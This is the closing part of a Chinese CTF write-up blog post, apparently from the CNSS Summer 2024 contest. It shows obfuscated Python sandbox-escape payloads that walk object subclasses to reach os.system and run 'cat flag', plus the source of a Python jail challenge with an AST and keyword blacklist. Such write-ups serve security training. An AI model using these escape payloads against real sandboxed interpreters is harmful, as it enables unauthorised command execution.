class="keyword">for</span> x <span class="keyword">in</span> ()［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">143</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">137</span>\<span class="number">137</span>)］［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">142</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">145</span>\<span class="number">137</span>\<span class="number">137</span>)］［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">163</span>\<span class="number">165</span>\<span class="number">142</span>\<span class="number">143</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">145</span>\<span class="number">163</span>\<span class="number">137</span>\<span class="number">137</span>)］() <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">119</span>)+<span class="built_in">chr</span>(<span class="number">114</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>) <span class="keyword">in</span> x［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">156</span>\<span class="number">141</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">137</span>\<span class="number">137</span>)］］pop(<span class="number">0</span>)(<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">121</span>)<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">109</span>))(<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">32</span>)+<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">103</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[x[<span class="string">&quot;\137\137\151\156\151\164\137\137&quot;</span>][<span class="string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>] <span class="keyword">for</span> x <span class="keyword">in</span> ()[<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>][<span class="string">&quot;\137\137\142\141\163\145\137\137&quot;</span>][<span class="string">&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;</span>]() <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">119</span>)+<span class="built_in">chr</span>(<span class="number">114</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>) <span class="keyword">in</span> x[<span class="string">&quot;\137\137\156\141\155\145\137\137&quot;</span>]]pop(<span class="number">0</span>)(<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">121</span>)<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">109</span>))(<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">32</span>)+<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">103</span>))</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12303">https://xz.aliyun.com/t/12303</a><br><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</a><br><a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/15/web-SSTI/">https://lazzzaro.github.io/2020/05/15/web-SSTI/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mumuhhh/p/17811377.html">https://www.cnblogs.com/mumuhhh/p/17811377.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647">https://xz.aliyun.com/t/12647</a><br>然后，又没时间看了，无后续++</p>
<h2 id="⛓️-jailbreak-again-and-again"><a href="#⛓️-jailbreak-again-and-again" class="headerlink" title="⛓️ jailbreak-again-and-again()"></a>⛓️ jailbreak-again-and-again()</h2><p><code>nc 156.238.233.117 47802</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># FROM python:3.12.3-alpine</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">BANNER = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">          .?77777777777777$.            </span></span><br><span class="line"><span class="string">          777..777777777777$+           </span></span><br><span class="line"><span class="string">         .77    7777777777$$$           </span></span><br><span class="line"><span class="string">         .777 .7777777777$$$$           </span></span><br><span class="line"><span class="string">         .7777777777777$$$$$$           </span></span><br><span class="line"><span class="string">         ..........:77$$$$$$$           </span></span><br><span class="line"><span class="string">  .77777777777777777$$$$$$$$$.=======.  </span></span><br><span class="line"><span class="string"> 777777777777777777$$$$$$$$$$.========  </span></span><br><span class="line"><span class="string">7777777777777777$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">77777777777777$$$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">777777777777$$$$$$$$$$$$$$$$ :========+.</span></span><br><span class="line"><span class="string">77777777777$$$$$$$$$$$$$$+..=========++~</span></span><br><span class="line"><span class="string">777777777$$..~=====================+++++</span></span><br><span class="line"><span class="string">77777777$~.~~~~=~=================+++++.</span></span><br><span class="line"><span class="string">777777$$$.~~~===================+++++++.</span></span><br><span class="line"><span class="string">77777$$$$.~~==================++++++++: </span></span><br><span class="line"><span class="string"> 7$$$$$$$.==================++++++++++. </span></span><br><span class="line"><span class="string"> .,$$$$$$.================++++++++++~.  </span></span><br><span class="line"><span class="string">         .=========~.........           </span></span><br><span class="line"><span class="string">         .=============++++++           </span></span><br><span class="line"><span class="string">         .===========+++..+++           </span></span><br><span class="line"><span class="string">         .==========+++.  .++           </span></span><br><span class="line"><span class="string">          ,=======++++++,,++,           </span></span><br><span class="line"><span class="string">          ..=====+++++++++=.            </span></span><br><span class="line"><span class="string">                ..~+=...     </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># Enough ?</span></span><br><span class="line">FORBIDDEN_AST = [</span><br><span class="line">    ast.Import,</span><br><span class="line">    ast.ImportFrom,</span><br><span class="line">    ast.ClassDef,</span><br><span class="line">    ast.FunctionDef,</span><br><span class="line">    ast.Assign,</span><br><span class="line">    ast.Eq,</span><br><span class="line">    ast.Add,</span><br><span class="line">    ast.Mult,</span><br><span class="line">    ast.Mod,</span><br><span class="line">    ast.Assert,</span><br><span class="line">    ast.Compare,</span><br><span class="line">    ast.AugAssign,</span><br><span class="line">    ast.AnnAssign,</span><br><span class="line">    ast.Call,</span><br><span class="line">]</span><br><span class="line">FORBIDDEN_PATTERNS = [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;class&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(c) &gt; <span class="number">0x100</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Code too long&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> FORBIDDEN_PATTERNS:</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden pattern found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        code.encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid encoding&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = ast.parse(c, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Syntax error&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ast.walk(c):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">in</span> FORBIDDEN_AST:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden operation found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&#x27;Enter base64 encoded code: &#x27;</span>)</span><br><span class="line">code = base64.b64decode(code.strip()).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">check(code)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    code = <span class="built_in">compile</span>(code, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>无后续++</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://hvang10.github.io">HvAng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://hvang10.github.io/2024/09/07/CNSS-Summer-2024-WriteUp/">https://hvang10.github.io/2024/09/07/CNSS-Summer-2024-WriteUp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/favicon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/10/cnss-recruit-2024/" title="cnss-recruit-2024"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">cnss-recruit-2024</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/06/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%85%BD%E5%AF%86%E6%9D%AF/" title="第二届煽密杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">第二届煽密杯</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">HvAng</div><div class="author-info__description">Just keep learning</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HvAng10"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is HvAng, a new star CTFer!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A6%B4-babyHTTP"><span class="toc-number">1.1.</span> <span class="toc-text">🦴 babyHTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%99%8B%F0%9F%8F%BC%E2%80%8D%E2%99%80%EF%B8%8F-PHPinfo"><span class="toc-number">1.2.</span> <span class="toc-text">🙋🏼‍♀️ PHPinfo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A5%87-%E6%88%91%E5%BE%97%E5%86%8D%E5%BF%AB%E7%82%B9"><span class="toc-number">1.3.</span> <span class="toc-text">🥇 我得再快点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8F%93-Ping"><span class="toc-number">1.4.</span> <span class="toc-text">🏓 Ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%90%B6-CNSS%E5%A8%98%E3%81%AE%E5%AE%A0%E7%89%A9%E5%95%86%E5%BA%97"><span class="toc-number">1.5.</span> <span class="toc-text">🐶 CNSS娘の宠物商店</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AE-2048"><span class="toc-number">1.6.</span> <span class="toc-text">🎮 2048</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%91%A4-%E6%8D%A2%E4%B8%AA%E5%A4%B4%E5%83%8F%E5%85%88"><span class="toc-number">1.7.</span> <span class="toc-text">👤 换个头像先</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9A%93-can-can-need-shell"><span class="toc-number">1.8.</span> <span class="toc-text">🚓 can can need shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%EF%B8%8F%E2%83%A3-EZRCCCCE"><span class="toc-number">1.9.</span> <span class="toc-text">7️⃣ EZRCCCCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A7-where-is-my-unserialize"><span class="toc-number">1.10.</span> <span class="toc-text">🔧 where is my unserialize?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%BB-CNSS%E5%A8%98%E3%81%AE%E8%81%8A%E5%A4%A9%E5%AE%A4"><span class="toc-number">1.11.</span> <span class="toc-text">💻 CNSS娘の聊天室</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8F%AA-CNSS%E5%A8%98%E3%81%AEFlag%E5%95%86%E5%BA%97"><span class="toc-number">1.12.</span> <span class="toc-text">🏪 CNSS娘のFlag商店</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%BD-Tomcat-cat"><span class="toc-number">1.13.</span> <span class="toc-text">😽 Tomcat?cat~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%BD-newsql"><span class="toc-number">1.14.</span> <span class="toc-text">💽 newsql()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%AA-CNSS%E5%A8%98%E3%81%AE%E8%87%AA%E5%8A%A9Flag%E5%95%86%E5%BA%97"><span class="toc-number">1.15.</span> <span class="toc-text">🔪 CNSS娘の自助Flag商店</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%90%A3-%E6%B2%A1%E6%9C%89%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RuoYi"><span class="toc-number">1.16.</span> <span class="toc-text">🐣 没有人比我更懂RuoYi()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">2.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%AFnc-nc"><span class="toc-number">2.1.</span> <span class="toc-text">😯nc? nc!</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%8D-%E9%82%A3%E4%B8%AA%E5%A5%B3%E4%BA%BA"><span class="toc-number">3.1.</span> <span class="toc-text">😍 那个女人</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%AD%E6%88%91%E7%9A%84flag%E7%A2%8E%E4%BA%86%E4%B8%80%E5%9C%B0"><span class="toc-number">3.2.</span> <span class="toc-text">😭我的flag碎了一地</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%99%BE%EF%B8%8F-%E4%BA%A6%E7%9C%9F%E4%BA%A6%E6%88%96%E4%BA%A6%E5%81%87"><span class="toc-number">3.3.</span> <span class="toc-text">♾️ 亦真亦或亦假</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8D%B5-%E8%8C%B6%E6%9D%AF%E5%A4%B4%E5%A4%A7%E5%86%92%E9%99%A9"><span class="toc-number">3.4.</span> <span class="toc-text">🍵 茶杯头大冒险</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%88%EF%B8%8F-%E6%89%93%E9%A3%9E%E6%9C%BA%E9%AB%98%E6%89%8B"><span class="toc-number">3.5.</span> <span class="toc-text">✈️ 打飞机高手</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%AE-cnss%E5%A8%98%E7%9A%84%E8%B0%9C%E8%AF%AD"><span class="toc-number">4.1.</span> <span class="toc-text">🔮 cnss娘的谜语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%90%AC-%E6%B0%B4%E9%BE%99%E5%90%9F"><span class="toc-number">4.2.</span> <span class="toc-text">🐬 水龙吟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%94-%E5%8D%9C%E7%AE%97%E5%AD%90"><span class="toc-number">4.3.</span> <span class="toc-text">🌔 卜算子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%90%A0-Fun-factoring"><span class="toc-number">4.4.</span> <span class="toc-text">🐠 Fun_factoring</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A6%A2-BabyCurve"><span class="toc-number">4.5.</span> <span class="toc-text">🦢 BabyCurve</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%91-Small-private-key"><span class="toc-number">4.6.</span> <span class="toc-text">🔑 Small private key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%90%BF%EF%B8%8F-%E7%89%A9%E4%B8%8D%E7%9F%A5%E6%95%B0"><span class="toc-number">4.7.</span> <span class="toc-text">🐿️ 物不知数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9A%92%EF%B8%8F-%E9%93%9C%E5%8C%A0%E7%9A%84%E8%89%BA%E6%9C%AF%E2%85%A1"><span class="toc-number">4.8.</span> <span class="toc-text">⚒️ 铜匠的艺术Ⅱ()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9B%8F%EF%B8%8F-%E9%93%9C%E5%8C%A0%E7%9A%84%E8%89%BA%E6%9C%AF%E2%85%A0"><span class="toc-number">4.9.</span> <span class="toc-text">⛏️ 铜匠的艺术Ⅰ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%8B-%E5%8F%92%E6%98%AF%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97"><span class="toc-number">4.10.</span> <span class="toc-text">😋 叒是欧几里得</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9A%BD-Permutation"><span class="toc-number">4.11.</span> <span class="toc-text">⚽ Permutation()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">5.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%99%88-%E5%B0%94%E8%BE%88%E4%B8%8D%E8%83%BD%E7%A9%B6%E7%89%A9%E7%90%86"><span class="toc-number">5.1.</span> <span class="toc-text">🙈 尔辈不能究物理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%A8-%E6%98%9F%E5%85%89%E4%B8%8B%E7%9A%84%E6%A2%A6%E6%83%B3"><span class="toc-number">5.2.</span> <span class="toc-text">✨ 星光下的梦想</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9B%93%EF%B8%8F-jailbreak"><span class="toc-number">5.3.</span> <span class="toc-text">⛓️ jailbreak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9B%93%EF%B8%8F-jailbreak-again"><span class="toc-number">5.4.</span> <span class="toc-text">⛓️ jailbreak-again()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9B%93%EF%B8%8F-jailbreak-again-and-again"><span class="toc-number">5.5.</span> <span class="toc-text">⛓️ jailbreak-again-and-again()</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/23/%E7%86%B5%E5%AF%86%E6%9D%AF2025-%E9%87%8D%E5%BA%86/" title="熵密杯2025-重庆">熵密杯2025-重庆</a><time datetime="2025-07-23T01:42:30.000Z" title="Created 2025-07-23 09:42:30">2025-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/01/%E9%9B%B6%E6%95%A3web%E9%A2%98%E8%AE%B0%E5%BD%95/" title="零散Web题记录">零散Web题记录</a><time datetime="2025-05-31T18:44:13.000Z" title="Created 2025-06-01 02:44:13">2025-06-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/26/ACTF2025/" title="ACTF2025">ACTF2025</a><time datetime="2025-04-26T09:21:20.000Z" title="Created 2025-04-26 17:21:20">2025-04-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/08/XYCTF2025-WriteUp/" title="XYCTF2025-WriteUp">XYCTF2025-WriteUp</a><time datetime="2025-04-07T19:19:43.000Z" title="Created 2025-04-08 03:19:43">2025-04-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/%E5%AF%86%E7%A0%81%E8%B6%A3%E9%A2%98%E8%AE%B0%E5%BD%95/" title="Cryptography趣题记录">Cryptography趣题记录</a><time datetime="2025-04-03T06:35:29.000Z" title="Created 2025-04-03 14:35:29">2025-04-03</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By HvAng</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>